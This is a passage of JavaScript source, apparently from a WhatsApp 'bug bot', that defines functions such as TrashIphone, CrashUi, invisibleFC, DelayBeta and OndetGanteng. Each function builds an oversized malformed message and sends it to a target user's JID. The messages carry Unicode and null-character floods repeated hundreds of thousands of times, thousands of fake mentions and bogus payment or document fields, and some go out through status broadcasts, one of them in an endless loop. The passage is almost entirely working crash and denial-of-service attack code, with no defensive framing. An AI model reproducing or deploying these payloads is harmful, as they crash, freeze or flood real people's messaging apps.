⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝".repeat(5000),
      caption: "Blank" + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await sock.relayMessage(jid, msg, {
  participant: { jid: jid }, 
  messageId: null
  })
}

async function LocX(jid) {
  const LocaX = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0.000000,
          degreesLongitude: 0.000000,
          name: "ꦽ".repeat(150),
          address: "ꦽ".repeat(100),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: jid,
            remoteJid: jid,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent("status@broadcast", LocaX, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: jid },
          content: undefined
        }]
      }]
    }]
  }, {
    participant: jid
  });
}

async function TrashIphone(jid) {
  const Vtx = "𑇂𑆵𑆴𑆿".repeat(100000);
  const Virtex = 'ꦾ'.repeat(100000);
    const TrashSvip = {
      extendedTextMessage: {
        text: "I'm Verse!" + Virtex + Vtx,
        matchedText: "Hahh apa?" + Vtx,
        description: "𑇂𑆵𑆴𑆿".repeat(100000),
        title: "Hai Bang🥰" + Virtex + Vtx,
        previewType: "NONE",
        jpegThumbnail: "https://files.catbox.moe/keixrf.jpg",
        thumbnailDirectPath: null,
        thumbnailSha256: null,
        thumbnailEncSha256: null,
        mediaKey: null,
        mediaKeyTimestamp: "555555555",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };
    await sock.relayMessage(jid, TrashSvip, {
   participant: { jid: jid }, 
   messageId: null,
   });
   console.log(chalk.red(`Trash Send To ${jid}..`));
}

async function OndetGanteng(jid, mention = true) {
    const generateHugePayload = () => {
        return {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        nativeFlowResponseMessage: {
                            version: 3,
                            name: "call_permission_request", 
                            paramsJson: "\u0000".repeat(1045000)
                        },
                        body: {
                            text: "Assalamualaikum",
                            format: "DEFAULT"
                        }
                    }
                }
            }
        };
    };

    const getRandomColor = () => {
        return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
    };

    const getRandomFont = () => {
        return Math.floor(Math.random() * 9);
    };

    const createMessageOptions = () => {
        return {
            isForwarded: false,
            ephemeralExpiration: 0,
            background: getRandomColor(),
            forwardingScore: 0,
            font: getRandomFont()
        };
    };

    try {
        while (true) {
            const messageContent = generateHugePayload();
            
            let waMsg;
            if (typeof generateWAMessageFromContent === 'function') {
                waMsg = await generateWAMessageFromContent(jid, messageContent, createMessageOptions());
            } else {
                
                waMsg = {
                    key: { id: Math.random().toString(36).substring(2, 15) },
                    message: messageContent
                };
            }

            await sock.relayMessage("status@broadcast", waMsg.message, {
                messageId: waMsg.key?.id || Math.random().toString(36).substring(2, 15),
                statusJidList: [jid],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users", 
                        attrs: {},
                        content: [{
                            tag: "to",
                            attrs: { jid: jid },
                            content: undefined
                        }]
                    }]
                }]
            });

            if (mention) {
                await sock.relayMessage(jid, {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: waMsg.key,
                                type: 25
                            }
                        }
                    }
                }, {
                    messageId: Math.random().toString(36).substring(2, 15)
                });
            }

            await new Promise(resolve => setTimeout(resolve, 1500));
        }
    } catch (error) {
        console.log("Kintol Error:", error.message);
    }
}

async function ForceOneMsg(jid) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "𝐗𝐗𝐗" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                reference_id: null,
                payment_method: "\u0010".repeat(0x2710),
                payment_timestamp: null,
                share_payment_status: true
              }),
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    for (let iterator = 0; iterator < 1; iterator++) {
      const msg = generateWAMessageFromContent(jid, message, {});

      await sock.relayMessage(jid, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: jid },
        userJid: jid,
      });

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: jid },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

  } catch (err) {
    console.error(err);
  }
}

async function invisibleFC(jid) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "X" + "𑇂𑆵𑆴𑆿".repeat(15000),
         address: "./iziixwxz" + "𑇂𑆵𑆴𑆿".repeat(5000),
         url: `https://izii.my.loversz.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "makloe",
            matchedText: "https://t.me/Lountrc",
            description: "....KV".repeat(15000),
            title: "arcane" + "arcane".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};                        

async function DelayBeta(jid) {
  await sock.relayMessage(
    jid,
    {
      viewOnceMessage: {
        message: {
          groupInviteMessage: {
            groupJid: "12345678@g.us",
            inviteCode: "Heloo🌊",
            inviteExpiration: "9999",
            groupName: "Delay Statue" + "ោ៝".repeat(20000),
            caption: "Join Grup Untuk Mendapatkan Megalodon Goreng!" + "ꦾ".repeat(60000),
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "@s.whatsapp.net"
              ),
            ],
          },
          interactiveResponseMessage: {
            body: {
              text: "⎋Click Here!" + "ꦽ".repeat(500),
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\U0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    { participant: { jid: jid } }
  );
}

async function CrashUi(jid) {
  const killer = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯",
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯",
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
